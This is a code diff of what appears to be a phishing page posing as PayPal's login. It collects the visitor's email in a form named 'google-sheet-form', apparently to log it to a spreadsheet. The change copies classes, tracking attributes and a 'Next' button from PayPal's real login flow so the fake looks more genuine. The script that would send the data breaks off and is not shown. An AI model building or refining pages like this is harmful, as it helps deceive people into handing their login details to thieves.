@@ -185,12 +185,12 @@ hs.src = ('//s10.histats.com/js15_as.js');
   <div id="content" class="contentContainerBordered">
 	<center><p><img alt="Pay Pal" src="logo.png"></p></center>
 		<!-- The Form -->
-<form id="google-sheet-form">
-	  <div class="textInput">
-	  <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="Enter Your Email" required="required">
-		  <button type="submit">Submit Form</button>
-	  </div>
-</form>
+		<form id="google-sheet-form" class="proceed maskable" autocomplete="off" name="login">
+			  <div class="textInput">
+				  <input id="email" name="email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="Enter Your Email" required="required">
+					  <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Next</button>
+			  </div>
+		</form>
 
 <!-- The Script -->
 <script>
